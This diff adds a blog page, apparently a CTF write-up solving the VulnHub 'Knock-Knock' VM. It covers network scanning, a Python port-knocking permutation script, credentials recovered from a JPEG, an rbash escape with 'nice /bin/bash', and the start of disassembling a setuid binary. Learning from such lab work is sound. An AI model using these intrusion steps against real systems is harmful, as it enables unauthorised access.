@@ -1,0 +1,1115 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en-us">
+<head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>knock-knock who’s there? solving knock knock &middot; </title>
+
+  
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/poole-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-overrides.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/hyde-x.css">
+  <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+
+  
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
+  <link href="https://leonjza.github.io/favicon.png" rel="icon">
+
+  
+  
+  
+  
+
+  <meta name="description" content="">
+  <meta name="keywords" content="">
+  
+</head>
+<body class="theme-base-0d">
+<div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      
+        <img src="https://www.gravatar.com/avatar/28d2f6c24dad39f38af0272dfc0da953?s=200"
+             alt="gravatar" title="">
+      
+      <h1></h1>
+      <p class="lead">#!/slash/note<br />
+<em>A checkbox unchecker&rsquo;s notepad</em></p>
+    </div>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/">Home</a></li>
+      
+      <li class="sidebar-nav-item"><a href="https://leonjza.github.io/about/">About</a></li>
+      
+    </ul>
+
+    <ul class="sidebar-nav">
+      <li class="sidebar-nav-item">
+      <a href="https://github.com/leonjza"><i class="fa fa-github-square fa-3x"></i></a>
+      
+      
+      
+      
+      
+      <a href="https://twitter.com/leonjza"><i class="fa fa-twitter-square fa-3x"></i></a>
+      
+      
+      </li>
+    </ul>
+
+    
+
+    <p>Copyright &copy; 2016 <a href="https://leonjza.github.io/license/">License</a><br/>
+       Powered by <a href="http://gohugo.io">Hugo</a> and <a href="https://github.com/zyro/hyde-x">Hyde-X</a></p>
+  </div>
+</div>
+
+
+<div class="content container">
+  <div class="post">
+    <h1>knock-knock who’s there? solving knock knock</h1>
+    <span class="post-date">Oct 14, 2014 &middot; 30 minute read &middot; <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/#disqus_thread">Comments</a>
+    
+    <br/>
+    <a class="label" href="https://leonjza.github.io/categories/ctf">CTF</a><a class="label" href="https://leonjza.github.io/categories/vulnerable-vm">Vulnerable VM</a><a class="label" href="https://leonjza.github.io/categories/solution">Solution</a><a class="label" href="https://leonjza.github.io/categories/challenge">Challenge</a><a class="label" href="https://leonjza.github.io/categories/vulnhub">VulnHub</a>
+    </span>
+    
+
+<h2 id="introduction:1122ba630e8da20bb861d870e35485fa">introduction</h2>
+
+<p><a href="http://vulnhub.com/series/knock-knock,53/">Knock-Knock</a> is a vulnerable boot2root VM by <a href="https://twitter.com/zer0w1re">@zer0w1re</a> and sure as heck was packed with interesting twists and things to learn!</p>
+
+<p>I figured I&rsquo;d just <em>have a quick look™</em>, and midnight that evening ended up with <em>root</em> privileges :D</p>
+
+<p>As always, if you have not done this VM yet, this post is a massive spoiler and I would highly recommend you close up here and try it first :)
+This is my experience &lsquo;knocking&rsquo; on the door.</p>
+
+<blockquote>
+<p>“Theodore!”</p>
+
+<p>“Theodore who?”</p>
+
+<p>“Theodore wasn&rsquo;t open so I knocked”</p>
+</blockquote>
+
+<h2 id="getting-started:1122ba630e8da20bb861d870e35485fa">getting started</h2>
+
+<p>As always, the vm&rsquo;s files were downloaded and imported into VirtualBox. I fired up the vm and watched <code>arp</code> for any new entries. This presented the first hurdle. A ping scan showed no new IP&rsquo;s in the network range my VM&rsquo;s were in (192.168.56.0/24):</p>
+
+<pre><code class="language-bash">$ sudo nmap -sN 192.168.56.0/24
+
+Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-14 09:51 SAST
+Nmap scan report for 192.168.56.1
+Host is up (0.000030s latency).
+All 1000 scanned ports on 192.168.56.1 are closed (936) or open|filtered (64)
+
+Nmap done: 256 IP addresses (1 host up) scanned in 14.99 seconds
+</code></pre>
+
+<p>Only the gateway was alive. A <code>arp -a</code> however spilled some of the beans:</p>
+
+<pre><code class="language-bash">$ arp -i vboxnet0 -a
+? (192.168.56.0) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
+? (192.168.56.1) at a:0:27:0:0:0 on vboxnet0 ifscope permanent [ethernet]
+? (192.168.56.2) at (incomplete) on vboxnet0 ifscope [ethernet]
+
+[... snip ...]
+
+? (192.168.56.201) at (incomplete) on vboxnet0 ifscope [ethernet]
+? (192.168.56.202) at (incomplete) on vboxnet0 ifscope [ethernet]
+? (192.168.56.203) at 8:0:27:be:dd:c8 on vboxnet0 ifscope [ethernet]
+? (192.168.56.204) at (incomplete) on vboxnet0 ifscope [ethernet]
+? (192.168.56.205) at (incomplete) on vboxnet0 ifscope [ethernet]
+
+[... snip ...]
+
+? (192.168.56.255) at ff:ff:ff:ff:ff:ff on vboxnet0 ifscope [ethernet]
+</code></pre>
+
+<p>Hello <code>.203</code>! Pinging 192.168.56.203 responded with Destination Port Unreachable messages:</p>
+
+<pre><code class="language-bash">root@kali:~# ping -c 2 192.168.56.203
+PING 192.168.56.203 (192.168.56.203) 56(84) bytes of data.
+From 192.168.56.203 icmp_seq=1 Destination Port Unreachable
+From 192.168.56.203 icmp_seq=2 Destination Port Unreachable
+
+--- 192.168.56.203 ping statistics ---
+2 packets transmitted, 0 received, +2 errors, 100% packet loss, time 999ms
+</code></pre>
+
+<p>While a little confusing at first, I figured the firewall was to blame here. I proceeded to focus my attention on this IP and did a normal <code>nmap</code> scan:</p>
+
+<pre><code class="language-bash">root@kali:~# nmap -sV --reason 192.168.56.203 -p-
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 10:03 SAST
+Nmap scan report for 192.168.56.203
+Host is up, received reset (0.0016s latency).
+Not shown: 65534 filtered ports
+Reason: 65534 no-responses
+PORT     STATE SERVICE REASON  VERSION
+1337/tcp open  waste?  syn-ack
+
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at http://www.insecure.org/cgi-bin/servicefp-submit.cgi :
+SF-Port1337-TCP:V=6.46%I=7%D=10/14%Time=543CEE50%P=i686-pc-linux-gnu%r(NUL
+SF:L,15,&quot;\[12247,\x202759,\x2026802\]\n&quot;)%r(GenericLines,15,&quot;\[37866,\x202
+SF:9242,\x203904\]\n&quot;)%r(GetRequest,15,&quot;\[29185,\x207368,\x2028937\]\n&quot;)%r
+SF:(HTTPOptions,15,&quot;\[55772,\x205315,\x2050180\]\n&quot;)%r(RTSPRequest,13,&quot;\[9
+SF:301,\x2026341,\x20574\]\n&quot;)%r(RPCCheck,16,&quot;\[34002,\x2046353,\x2023995\
+SF:]\n&quot;)%r(DNSVersionBindReq,16,&quot;\[47043,\x2037532,\x2024012\]\n&quot;)%r(DNSSt
+SF:atusRequest,15,&quot;\[31914,\x208919,\x2027965\]\n&quot;)%r(Help,15,&quot;\[63865,\x2
+SF:07077,\x2055801\]\n&quot;)%r(SSLSessionReq,15,&quot;\[30406,\x208520,\x2047713\]\
+SF:n&quot;)%r(Kerberos,16,&quot;\[10459,\x2050977,\x2063996\]\n&quot;)%r(SMBProgNeg,16,&quot;\
+SF:[61080,\x2038407,\x2048416\]\n&quot;)%r(X11Probe,15,&quot;\[61127,\x2058212,\x203
+SF:856\]\n&quot;)%r(FourOhFourRequest,16,&quot;\[11007,\x2051452,\x2038765\]\n&quot;)%r(L
+SF:PDString,15,&quot;\[5738,\x2063719,\x2026394\]\n&quot;)%r(LDAPBindReq,14,&quot;\[14292
+SF:,\x20937,\x2020668\]\n&quot;)%r(SIPOptions,16,&quot;\[33684,\x2058491,\x2031373\]
+SF:\n&quot;)%r(LANDesk-RC,16,&quot;\[58946,\x2030941,\x2053345\]\n&quot;)%r(TerminalServe
+SF:r,15,&quot;\[6672,\x2031370,\x2053882\]\n&quot;)%r(NCP,16,&quot;\[15356,\x2041972,\x20
+SF:52087\]\n&quot;)%r(NotesRPC,16,&quot;\[51444,\x2044303,\x2013901\]\n&quot;)%r(WMSReque
+SF:st,13,&quot;\[87,\x2044952,\x2060309\]\n&quot;)%r(oracle-tns,15,&quot;\[51073,\x204686
+SF:0,\x206777\]\n&quot;)%r(afp,16,&quot;\[30287,\x2064026,\x2029364\]\n&quot;)%r(kumo-ser
+SF:ver,14,&quot;\[17824,\x2048485,\x20579\]\n&quot;);
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 5521.11 seconds
+</code></pre>
+
+<h2 id="knock-knock:1122ba630e8da20bb861d870e35485fa">knock knock&hellip;</h2>
+
+<p><code>tcp/1337</code> was the only open port on the machine. I promptly connected to it to see what we have:</p>
+
+<pre><code class="language-bash">root@kali:~# nc -vn 192.168.56.203 1337
+(UNKNOWN) [192.168.56.203] 1337 (?) open
+[6605, 29872, 38566]
+
+root@kali:~# nc -vn 192.168.56.203 1337
+(UNKNOWN) [192.168.56.203] 1337 (?) open
+[43059, 22435, 17432]
+</code></pre>
+
+<p>Interesting. Each connection returns a list of numbers. At this stage I should mention that the name of the VM, together with the list of 3 numbers (which look like port numbers as they are always below 65535) had me think that this had to be the sequence in which we have to knock ports to open others.</p>
+
+<p><a href="http://en.wikipedia.org/wiki/Port_knocking">Port knocking</a> generally means that we send a sequence of packets on specific ports so that the listener may perform a certain action when the correct sequence has been &lsquo;knocked&rsquo;. Think of it literally as if someone knocks 3 times at your door and you open up. The only thing is the 3 knocks have to be in a specific order, and if they are not, you will generally ignore the person at the door. It&rsquo;s also important to note that you will also not react to say a single knock. Only those 3 specific ones.</p>
+
+<p>There are plenty of implementations of port knocking out there. My personal favorite being <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> by <a href="https://twitter.com/moxie">@moxie</a>. I have previously played with this implementation and its pretty sweet. A crypted packet is sent to a machine that is logging firewall drops. <a href="http://www.thoughtcrime.org/software/knockknock/">knock-knock</a> tails the <code>kern.log</code> and reacts on the correct sequences.</p>
+
+<p>This VM did not give any hints on secrets, so I figured that the implementation is probably not this one. But which one is it? Hard to say at this stage.</p>
+
+<h2 id="whos-there:1122ba630e8da20bb861d870e35485fa">&hellip;whos there?</h2>
+
+<p>So with the <code>tcp/1337</code> service telling us a sequence, I set out to test this knocking theory. The first attempt was simply a loop over the ports, using <code>nmap</code> to scan them:</p>
+
+<pre><code class="language-bash">root@kali:~# for PORT in 43059 22435 17432; do nmap -PN 192.168.56.203 -p $PORT; done
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
+Nmap scan report for 192.168.56.203
+Host is up.
+PORT      STATE    SERVICE
+43059/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
+Nmap scan report for 192.168.56.203
+Host is up.
+PORT      STATE    SERVICE
+22435/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:25 SAST
+Nmap scan report for 192.168.56.203
+Host is up.
+PORT      STATE    SERVICE
+17432/tcp filtered unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 2.07 seconds
+</code></pre>
+
+<p>With that done, I rescanned the box for any new open ports but nothing was different. I retried the <code>nmap</code> loop just to make sure, but it did not appear to make a difference.</p>
+
+<p>Remembering that the sequence changed every time you connected to the <code>tcp/1337</code> service, I figured it may change some configuration on the server to accept a new sequence. So, I re-connected to the <code>tcp/1337</code> service, and looped over the new sequence. Still, nothing. At this stage a was starting to feel relatively lost as to what may be happening. I returned to doing some research on some implementations of this knock knock concept and came across <a href="https://github.com/jvinet/knock">knockd</a>. I downloaded the <a href="https://github.com/jvinet/knock/blob/master/src/knock.c">client</a> and compiled locally with <code>gcc knock.c -o knock</code> and tested to see if this makes any difference.</p>
+
+<p>Still nothing. Inspecting this clients sources actually revealed nothing spectacular, and so I though my last resort will be to capture some traffic via wireshark and see if I can figure out anything strange there.</p>
+
+<h2 id="22-and-80-too:1122ba630e8da20bb861d870e35485fa">22 and 80 too</h2>
+
+<p>The wireshark testing revealed nothing out of the ordinary. The traffic was behaving as expected. I continuously connected to the <code>tcp/1337</code> service and toyed with some scapy to get different packet variations sent, followed by a full nmap. No dice. A sample scapy session was:</p>
+
+<pre><code class="language-bash">&gt;&gt;&gt; ip=IP(dst=&quot;192.168.56.203&quot;)
+&gt;&gt;&gt; SYN=TCP(dport=40508,flags=&quot;S&quot;)
+&gt;&gt;&gt; send(ip/SYN)
+.
+Sent 1 packets.
+&gt;&gt;&gt;
+</code></pre>
+
+<p>After quite some time, suddenly, nmap reports <code>tcp/22</code> and <code>tcp/80</code> as open&hellip;</p>
+
+<pre><code class="language-bash">root@kali:~# nmap 192.168.56.203
+
+Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-14 11:40 SAST
+Nmap scan report for 192.168.56.203
+Host is up (0.00032s latency).
+Not shown: 998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 4.98 seconds
+</code></pre>
+
+<p><strong>W.T.F.</strong> I actually had no idea why this worked. I had some theories, but based on the amount of testing I did, I figured that I effectively brute-forced my way in.</p>
+
+<p>With the ports now open, I did shuffle some ideas with a few people, and it came out the the sequence may be randomized. With that in mind, I decided to slap together a python script that will try all of the possible sequences and knock all of them, hoping that one of them is eventually the correct one:</p>
+
+<pre><code class="language-python">#!/usr/bin/python
+
+import socket
+import itertools
+import sys
+
+destination = &quot;192.168.56.203&quot;
+
+def clean_up_ports(raw_string):
+    &quot;&quot;&quot; Clean up the raw string received on the socket&quot;&quot;&quot;
+    if len(raw_string) &lt;= 0:
+        return None
+
+    # Remove the first [
+    raw_string = raw_string.replace('[','')
+    # Remove the second ]
+    raw_string = raw_string.replace(']','')
+    # split by commas
+    first_list = raw_string.split(',')
+
+    # start e empty return list
+    ports = []
+    for port in first_list:
+        # strip the whitespace around the string
+        # and cast to a integer
+        ports.append(int(port.strip()))
+
+    return  ports
+
+def main():
+    print &quot;[+] Getting sequence&quot;
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect((destination, 1337))
+    except Exception as e:
+        print &quot;[+] Unable to connect to %s on port 1337. %s&quot; % (destination, e)
+        sys.exit(1)
+
+    # receive the list
+    raw_list = sock.recv(20)
+
+    # get the ports in a actual python list
+    ports = clean_up_ports(raw_list)
+
+    print &quot;[+] Sequence is %s&quot; % ports
+    print &quot;[+] Knocking on the door using all the possible combinations...\n&quot;
+
+    # Lets knock all of the possible combinations of the ports list
+    for port_list in itertools.permutations(ports):
+
+        print &quot;[+] Knocking with sequence: %s&quot; % (port_list,)
+        for port in port_list:
+            print &quot;[+] Knocking on port %s:%s&quot; % (destination,port)
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(0.1)
+            sock.connect_ex((destination, port))
+            sock.close()
+
+        print &quot;[+] Finished sequence knock\n&quot;
+
+if __name__ == '__main__':
+    print &quot;[+] Knock knock opener&quot;
+    main()
+    print &quot;[+] Done&quot;
+
+</code></pre>
+
+<p>Running this opened the ports every go :)</p>
+
+<p>I know that I could test to see if say <code>tcp/22</code> was open, but I went with the assumption that you don&rsquo;t know what the actual ports are that should be opened, and hence the complete run of all of the permutations.</p>
+
+<h2 id="may-i-burn-the-door-now:1122ba630e8da20bb861d870e35485fa">may I burn the door now?</h2>
+
+<p>So, focus shifted to the web server at <code>tcp/80</code>. Browsing to the web server presented us with the following:</p>
+
+
+<figure >
+    
+        <img src="https://leonjza.github.io/images/knock_knock_web.png" />
+    
+    
+</figure>
+
+
+<p>Any path/file that you browse to will return this exact same picture. Sound familiar? :) This kinda breaks any form of scanning and or enumeration via things like <code>wfuzz</code> etc. With the hint <em>Gotta look harder</em>, I decided to move my attention to the door image itself.</p>
+
+<pre><code class="language-bash">root@kali:~# wget http://192.168.56.203/knockknock.jpg
+--2014-10-14 13:04:34--  http://192.168.56.203/knockknock.jpg
+Connecting to 192.168.56.203:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 84741 (83K) [image/jpeg]
+Saving to: `knockknock.jpg'
+
+100%[============&gt;] 84,741      68.2K/s   in 1.2s
+
+2014-10-14 13:04:35 (68.2 KB/s) - `knockknock.jpg' saved [84741/84741]
+</code></pre>
+
+<p>I will admit that I was not very keen on the idea that something may be stego&rsquo;d in the image and I was really hoping the hint would be very obvious. I opened up the image in a image viewer and zoomed in a little on the artifact I noticed at the bottom of the image. Nothing I could make real use of there.</p>
+
+<p>Next, I ran the image through exiftool:</p>
+
+<pre><code class="language-bash">root@kali:~/Desktop/knock-knock# exiftool knockknock.jpg
+ExifTool Version Number         : 8.60
+File Name                       : knockknock.jpg
+Directory                       : .
+File Size                       : 83 kB
+File Modification Date/Time     : 2014:10:06 18:38:30+02:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.02
+Resolution Unit                 : None
+X Resolution                    : 100
+Y Resolution                    : 100
+Quality                         : 74%
+XMP Toolkit                     : Adobe XMP Core 4.1-c036 46.276720, Mon Feb 19 2007 22:13:43
+Marked                          : © Estate of Roy Lichtenstein
+Web Statement                   : © Estate of Roy Lichtenstein
+Rights                          : © Estate of Roy Lichtenstein
+DCT Encode Version              : 100
+APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
+APP14 Flags 1                   : (none)
+Color Transform                 : YCbCr
+Image Width                     : 650
+Image Height                    : 788
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
+Image Size                      : 650x788
+</code></pre>
+
+<p>Roy Lichtenstein. The artist of the knock knock image?
+Anyways. As you can see, nothing else that is really useful here. So the next part was to have a look at the jpeg in a raw perspective. I am no forensics expert or anything so I am pretty limited in knowledge here.</p>
+
+<p>My idea was to try and recover the jpeg data from <code>knockknock.jpg</code> using <code>recoverjpeg</code>, and then compare the resulting image with the original and check for any differences.</p>
+
+<pre><code class="language-bash"># extract the jpeg data
+root@kali:~# recoverjpeg knockknock.jpg
+Restored 1 picture
+
+# the output image from the extract
+root@kali:~# ls image00000.jpg
+image00000.jpg
+
+# the cmp
+root@kali:~# cmp image00000.jpg knockknock.jpg
+cmp: EOF on image00000.jpg
+</code></pre>
+
+<p>So, the EOF differs from the 2 files. Lets check them out. First the extracted jpeg data file to see what it sais:</p>
+
+<pre><code class="language-bash">root@kali:~# tail -n 1 image00000.jpg
+9��&lt;V ��v�ܫQqRJ5U�&lt;��W�V9`��5BV(��&lt;�t�WS�����1h
+                                                         ��\���z$���vB��
+</code></pre>
+
+<p>As expected, junk :P Lets look at <code>knockknock.jpeg</code>:</p>
+
+<pre><code class="language-bash">root@kali:~# tail -n 4 knockknock.jpg
+⭚|U���b��[�k|U�������+\U����]�U¸��qW|U�]�qWX�F��*��kz����]��ѭqV�k튷�P���b��T�\+\U��Wo��9b�&lt;�V��]���B��[�v*�Uثx�X�x�[����o������|U����v*�^��x��Wb�o���b��b��[����qU����צ*����*���qW�
+Login Credentials
+abfnW
+sax2Cw9Ow
+</code></pre>
+
+<p>Hah! Login Credentials sound very promising!! :)</p>
+
+<h2 id="ceasar-opens-the-door:1122ba630e8da20bb861d870e35485fa">ceasar opens the door</h2>
+
+<p>After finding the hidden strings in the jpeg, I came to a quick realization that <code>abfnW:sax2Cw9Ow</code> was not a username:password combination for the SSH service. Nor was any variations of the 2 strings.</p>
+
+<p>I tried to browse to the paths in the web server such as <code>abfnW/</code> and <code>sax2Cw9Ow/</code>, but still only got the knock knock image. With these arb strings and nothing else really to go on, I had to try get a hint on this.</p>
+
+<p>Turns out, the strings were encoded using a Ceasar Cipher (<a href="http://en.wikipedia.org/wiki/Caesar_cipher">ROT13</a>). With that in mind, I took to a few python 1 liners to decode the strings. Lets start with <strong>abfnW</strong>:</p>
+
+<pre><code class="language-bash">root@kali:~# python -c 'print &quot;abfnW&quot;.decode(&quot;rot13&quot;)'
+nosaJ
+</code></pre>
+
+<p>abfnW decoded directly to <strong>nosaJ</strong>. That is <em>Jason</em> reversed. So is the username <code>Jason</code>? Next, I tackled <code>sax2Cw9Ow</code> in a similar fashion:</p>
+
+<pre><code class="language-bash">root@kali:~# python -c 'print &quot;sax2Cw9Ow&quot;.decode(&quot;rot13&quot;)'
+fnk2Pj9Bj
+</code></pre>
+
+<p>sax2Cw9Ow decodes to <strong>fnk2Pj9Bj</strong>. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is <strong>jason</strong> (without the cap <em>J</em>) and the password is <strong>fnk2Pj9Bj</strong> (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:</p>
+
+<pre><code class="language-bash"># username
+root@kali:~# python -c 'print &quot;abfnW&quot;.decode(&quot;rot13&quot;)[::-1].lower()'
+jason
+
+# password
+root@kali:~# python -c 'print &quot;sax2Cw9Ow&quot;.decode(&quot;rot13&quot;)[::-1]'
+jB9jP2knf
+</code></pre>
+
+<p>So to get our first shell:</p>
+
+<pre><code class="language-bash">root@kali:~/Desktop/knock-knock# ssh jason@192.168.56.203
+jason@192.168.56.203's password:
+
+Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+You have new mail.
+Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
+jason@knockknock:~$
+</code></pre>
+
+<h2 id="no-rbash-just-no:1122ba630e8da20bb861d870e35485fa">no rbash, just no</h2>
+
+<p>Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:</p>
+
+<pre><code class="language-bash">jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
+-rbash: /dev/null: restricted: cannot redirect output
+</code></pre>
+
+<p>Rbash? Oh well thats ok. I checked by inspecting the env var for <code>SHELL</code> which was <code>/bin/rbash</code> just to confirm. Thanks to having recently met a similar situation during the <a href="https://leonjza.github.io/blog/2014/09/18/from-persistence/">Persistence</a> boot2root and learning new ways of breaking out of <code>rbash</code>, I just typed <code>nice /bin/bash</code>, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full <code>bash</code> shell.</p>
+
+<h2 id="tiny-file-crypter:1122ba630e8da20bb861d870e35485fa">tiny file crypter</h2>
+
+<p>Some quick initial enumeration did not reveal anything particularly interesting. In <code>jason</code>&rsquo;s home folder though was a file called <code>tfc</code>:</p>
+
+<pre><code class="language-bash">jason@knockknock:~$ ls -lah
+total 32K
+drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
+drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
+lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
+-rw-r--r-- 1 jason jason 3.4K Sep 25 21:58 .bashrc
+-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
+-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
+-rw------- 1 jason jason 2.4K Oct 11 18:42 .viminfo
+
+jason@knockknock:~$ ./tfc
+_______________________________
+\__    ___/\_   _____/\_   ___ \
+  |    |    |    __)  /    \  \/
+  |    |    |     \   \     \____
+  |____|    \___  /    \______  /
+                \/            \/
+
+    Tiny File Crypter - 1.0
+
+Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
+jason@knockknock:~$
+</code></pre>
+
+<p><em>Tiny File Crypter</em> appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the <code>setuid</code> bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.</p>
+
+<p>Some important observations about <code>tfc</code> during the first bits of testing; Input and output files must have the <code>.tfc</code> extension. <code>tfc</code> does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by <code>tfc</code>. Considering its run as root, that probably wont be a problem.</p>
+
+<p>A sample encryption run can be seen as:</p>
+
+<pre><code class="language-bash"># we have a source document
+jason@knockknock:~$ cat test.tfc
+This is a test document.
+
+# we run the encryption program over it
+jason@knockknock:~$ ./tfc test.tfc crypt.tfc
+&gt;&gt; File crypted, goodbye!
+
+# dump the encrypted file as hex. from the ascii we
+# can see its no longer human readable
+jason@knockknock:~$ xxd crypt.tfc
+0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&lt;..&quot;&amp;..@^.jm
+0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j
+
+# the resulting file is owned by root
+jason@knockknock:~$ ls -l crypt.tfc
+-rw-r--r-- 1 root jason 25 Oct 14 08:12 crypt.tfc
+</code></pre>
+
+<p>Now, there is one very important finding. We can reverse the encrypted file by simply running it through <code>tfc</code> again:</p>
+
+<pre><code class="language-bash">jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc
+&gt;&gt; File crypted, goodbye!
+
+jason@knockknock:~$ cat reversed.tfc
+This is a test document.
+</code></pre>
+
+<p>After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is <a href="http://en.wikipedia.org/wiki/Symmetric-key_algorithm">symmetric</a> using the same key for encryption and decryption.</p>
+
+<p>But ok. That actually means nothing now. It also definitely does not tell us how to break <code>tfc</code> either!</p>
+
+<h2 id="fuzzing-disassembling-tfc:1122ba630e8da20bb861d870e35485fa">fuzzing &amp; disassembling tfc</h2>
+
+<p>With all of the information gathered thus far about <code>tfc</code>, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override <code>/etc/shadow</code> to replace <code>root</code>s password, or replace <code>/root/.ssh/authorized_keys</code> with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the <code>.tfc</code> extension.</p>
+
+<p>By now it became very apparent that we have to bring <code>tfc</code> under the microscope and have a closer look at what is happening inside. The first step was to run <code>tfc</code> through <code>strings</code> and check the output:</p>
+
+<pre><code class="language-bash">jason@knockknock:~$ strings tfc
+/lib/ld-linux.so.2
+
+[... snip ...]
+
+[^_]
+    Tiny File Crypter - 1.0
+Usage: ./tfc &lt;filein.tfc&gt; &lt;fileout.tfc&gt;
+&gt;&gt; Filenames need a .tfc extension
+&gt;&gt; No symbolic links!
+&gt;&gt; Failed to open input file
+&gt;&gt; Failed to create the output file
+&gt;&gt; File crypted, goodbye!
+;*2$&quot;
+_______________________________
+\__    ___/\_   _____/\_   ___ \
+  |    |    |    __)  /    \  \/
+  |    |    |     \   \     \____
+  |____|    \___  /    \______  /
+                \/            \/
+</code></pre>
+
+<p>As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D</p>
+
+<p>I figured I needed to get <code>tfc</code> into <code>gdb</code> and inspect it further there, however this VM did not have <code>gdb</code> installed. So, I copied it off the VM onto my Kali Linux install and plugged it into <code>gdb</code>. Then, to get an idea of what its doing, I started to disassemble it, starting with <code>main</code>:</p>
+
+<pre><code class="language-bash">root@kali:~# gdb -q ./tfc
+Reading symbols from /root/tfc...(no debugging symbols found)...done.
+gdb-peda$ disass main
+Dump of assembler code for function main:
+   0x08048924 &lt;+0&gt;: push   ebp
+   0x08048925 &lt;+1&gt;: mov    ebp,esp
+
+   [... snip ...]
+
+   0x0804894e &lt;+42&gt;:    mov    DWORD PTR [esp],eax
+   0x08048951 &lt;+45&gt;:    call   0x80486e6 &lt;cryptFile&gt;    #&lt;---
+   0x08048956 &lt;+50&gt;:    test   eax,eax
+
+   [... snip ...]
+
+   0x0804896c &lt;+72&gt;:    ret
+End of assembler dump.
+gdb-peda$
+</code></pre>
+
+<p>After some initial setup work and argument checks we notice a call to a function called <code>cryptFile</code>. So the next logical step was to check what happening in that function:</p>
+
+<pre><code class="language-bash">gdb-peda$ disass cryptFile
+Dump of assembler code for function cryptFile:
+   0x080486e6 &lt;+0&gt;: push   ebp
+   0x080486e7 &lt;+1&gt;: mov    ebp,esp
+   0x080486e9 &lt;+3&gt;: sub    esp,0x1088
+
+   [... snip ...]
+
+   0x080488a8 &lt;+450&gt;:   mov    DWORD PTR [esp],eax
+   0x080488ab &lt;+453&gt;:   call   0x8048618 &lt;xcrypt&gt;       #&lt;---
+   0x080488b0 &lt;+458&gt;:   mov    eax,DWORD PTR [ebp-0x14]
+
+   [... snip ...]
+
+   0x08048922 &lt;+572&gt;:   leave
+   0x08048923 &lt;+573&gt;:   ret
+End of assembler dump.
+gdb-peda$
+</code></pre>
+
